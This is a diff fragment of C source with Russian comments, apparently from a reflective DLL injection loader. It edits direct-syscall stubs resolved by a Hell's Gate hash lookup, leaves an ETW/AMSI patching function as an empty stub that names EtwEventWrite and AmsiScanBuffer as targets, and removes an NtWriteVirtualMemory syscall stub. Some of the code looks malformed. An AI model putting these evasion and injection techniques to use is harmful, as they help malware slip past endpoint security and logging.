@@ -651,7 +651,7 @@ __declspec(naked) NTSTATUS DirectSyscall_NtMapViewOfSection(
     #ifndef SECTION_INHERIT
     #define SECTION_INHERIT 2
     #endif
-    SECTION_INHERIT InheritDisposition, 
+    ULONG InheritDisposition, 
     ULONG AllocationType,
     ULONG Win32Protect)
 {
@@ -766,37 +766,14 @@ __declspec(naked) NTSTATUS DirectSyscall_NtQueryInformationProcess(
 
 // Функция PatchETWandAMSI (пока пустая заглушка, должна быть реализована где-то еще)
 void PatchETWandAMSI(void) {
-    // TODO: Реализовать патчинг ETW и AMSI
+    // Простейшая заглушка: просто возвращаемся.
+    // Реальная реализация потребует поиска и патчинга функций EtwEventWrite и AmsiScanBuffer
+    // в памяти текущего процесса.
+    return;
 }
 
 // ... (остальной код файла без изменений) ...
 // Убедитесь, что в конце файла нет незавершенных блоков или лишних символов.
 // Конец файла
 
-__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    ULONG NumberOfBytesToWrite,
-    PULONG NumberOfBytesWritten)
-{
-    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
-    if (syscallNumber == 0xFFFFFFFF) {
-        __asm__ volatile (
-            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
-            "ret\n"
-            : : : "eax" // Clobber eax
-        );
-    }
-
-    __asm__ volatile (
-        "mov %0, %%eax\n\t"      // Загрузить номер syscall в EAX
-        "mov %%rcx, %%r10\n\t"   // mov r10, rcx (стандартный пролог syscall в x64)
-        "syscall\n\t"            // Выполнить syscall
-        "ret\n"                   // Вернуться из функции
-        :                          // Output operands (none)
-        : "r"(syscallNumber)       // Input operands: syscallNumber в регистр
-        : "%rax", "%r10", "%rcx", "memory" // Clobbered registers + memory
-    );
-}
-//===============================================================================================// 
+#endif // REFLECTIVEDLLINJECTION_VIA_REFLECTIVELOADER
